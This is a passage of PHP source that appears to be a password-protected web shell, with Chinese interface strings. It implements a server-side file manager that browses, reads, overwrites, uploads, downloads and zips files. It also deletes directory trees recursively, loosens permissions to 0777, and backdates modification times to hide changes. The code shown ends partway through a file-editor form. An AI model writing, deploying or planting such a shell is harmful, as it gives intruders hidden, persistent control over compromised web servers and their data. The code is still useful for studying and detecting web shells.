<?php

$password = "longaotian";//设置密码

error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
set_time_limit(0);

function Root_GP(&$array)
{
while(list($key,$var) = each($array))
{
if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
{
if(is_string($var)) $array[$key] = stripslashes($var);
if(is_array($var)) $array[$key] = Root_GP($var);
}
}
return $array;
}

function Root_CSS()
{
print<<<END
<style type="text/css">
*{padding:0; margin:0;}
body{background:threedface;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
a{color:#000000;text-decoration:none;}
a:hover{background:#BBBBBB;}
table{color:#000000;font-family:"Verdana", "Tahoma", "宋体",sans-serif;font-size:13px;border:1px solid #999999;}
td{background:#F9F6F4;}
.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
</style>\n
END;
return false;
}

//文件管理
class packdir
{
var $out = '';
var $datasec = array();
var $ctrl_dir = array();
var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
var $old_offset = 0;
function packdir($array)
{
if(@function_exists('gzcompress'))
{
for($n = 0;$n < count($array);$n++)
{
$array[$n] = urldecode($array[$n]);
$fp = @fopen($array[$n], 'r');
$filecode = @fread($fp, @filesize($array[$n]));
@fclose($fp);
$this -> filezip($filecode,basename($array[$n]));
}
@closedir($zhizhen);
$this->out = $this->packfile();
return true;
}
return false;
}
function at($atunix = 0)
{
$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
if ($unixarr['year'] < 1980)
{
$unixarr['year'] = 1980;
$unixarr['mon'] = 1;
$unixarr['mday'] = 1;
$unixarr['hours'] = 0;
$unixarr['minutes'] = 0;
$unixarr['seconds'] = 0;
}
return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
}
function filezip($data, $name, $time = 0)
{
$name = str_replace('\\', '/', $name);
$dtime = dechex($this->at($time));
$hexdtime = '\x'.$dtime[6].$dtime[7].'\x'.$dtime[4].$dtime[5].'\x'.$dtime[2].$dtime[3].'\x'.$dtime[0].$dtime[1];
eval('$hexdtime = "' . $hexdtime . '";');
$fr = "\x50\x4b\x03\x04";
$fr .= "\x14\x00";
$fr .= "\x00\x00";
$fr .= "\x08\x00";
$fr .= $hexdtime;
$unc_len = strlen($data);
$crc = crc32($data);
$zdata = gzcompress($data);
$c_len = strlen($zdata);
$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
$fr .= pack('V', $crc);
$fr .= pack('V', $c_len);
$fr .= pack('V', $unc_len);
$fr .= pack('v', strlen($name));
$fr .= pack('v', 0);
$fr .= $name;
$fr .= $zdata;
$fr .= pack('V', $crc);
$fr .= pack('V', $c_len);
$fr .= pack('V', $unc_len);
$this -> datasec[] = $fr;
$new_offset = strlen(implode('', $this->datasec));
$cdrec = "\x50\x4b\x01\x02";
$cdrec .= "\x00\x00";
$cdrec .= "\x14\x00";
$cdrec .= "\x00\x00";
$cdrec .= "\x08\x00";
$cdrec .= $hexdtime;
$cdrec .= pack('V', $crc);
$cdrec .= pack('V', $c_len);
$cdrec .= pack('V', $unc_len);
$cdrec .= pack('v', strlen($name) );
$cdrec .= pack('v', 0 );
$cdrec .= pack('v', 0 );
$cdrec .= pack('v', 0 );
$cdrec .= pack('v', 0 );
$cdrec .= pack('V', 32 );
$cdrec .= pack('V', $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function packfile()
{
$data = implode('', $this -> datasec);
$ctrldir = implode('', $this -> ctrl_dir);
return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
}
}

function File_Str($string)
{
return str_replace('//','/',str_replace('\\','/',$string));
}

function File_Size($size)
{
if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
else $size = $size . ' B';
return $size;
}

function File_Mode()
{
$RealPath = realpath('./');
$SelfPath = $_SERVER['PHP_SELF'];
$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}

function File_Read($filename)
{
$handle = @fopen($filename,"rb");
$filecode = @fread($handle,@filesize($filename));
@fclose($handle);
return $filecode;
}

function File_Write($filename,$filecode,$filemode)
{
$key = true;
$handle = @fopen($filename,$filemode);
if(!@fwrite($handle,$filecode))
{
@chmod($filename,0666);
$key = @fwrite($handle,$filecode) ? true : false;
}
@fclose($handle);
return $key;
}

function File_Up($filea,$fileb)
{
$key = @copy($filea,$fileb) ? true : false;
if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;
return $key;
}

function File_Down($filename)
{
if(!file_exists($filename)) return false;
$filedown = basename($filename);
$array = explode('.', $filedown);
$arrayend = array_pop($array);
header('Content-type: application/x-'.$arrayend);
header('Content-Disposition: attachment; filename='.$filedown);
header('Content-Length: '.filesize($filename));
@readfile($filename);
exit;
}

function File_Deltree($deldir)
{
if(($mydir = @opendir($deldir)) == NULL) return false;
while(false !== ($file = @readdir($mydir)))
{
$name = File_Str($deldir.'/'.$file);
if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);File_Deltree($name);}
if(is_file($name)){@chmod($name,0777);@unlink($name);}
}
@closedir($mydir);
@chmod($deldir,0777);
return @rmdir($deldir) ? true : false;
}

function File_Act($array,$actall,$inver)
{
if(($count = count($array)) == 0) return '请选择文件';
if($actall == 'e')
{
$zip = new packdir;
if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
return '打包所选文件失败';
}
$i = 0;
while($i < $count)
{
$array[$i] = urldecode($array[$i]);
switch($actall)
{
case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
}
$i++;
}
return '所选文件'.$msg.'完毕';
}

function File_Edit($filepath,$filename,$dim = '')
{
$THIS_DIR = urlencode($filepath);
$THIS_FILE = File_Str($filepath.'/'.$filename);
if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}
else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
print<<<END
<script language="javascript">
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
var txt, i, found;
if(str == "")return false;
if(NS4){
if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
if(n == 0) alert(str + " ... Not-Find")
}
if(IE4){
txt = win.document.body.createTextRange();
for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
txt.moveStart("character", 1);
txt.moveEnd("textedit")
}
if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
}
return false
}
function CheckDate(){
var re = document.getElementById('mtime').value;
var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/;
var r = re.match(reg);
if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
else{document.getElementById('editor').submit();}
}
</script>
<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="查找" onclick="search(searchs.value)"></div>
<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
<div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}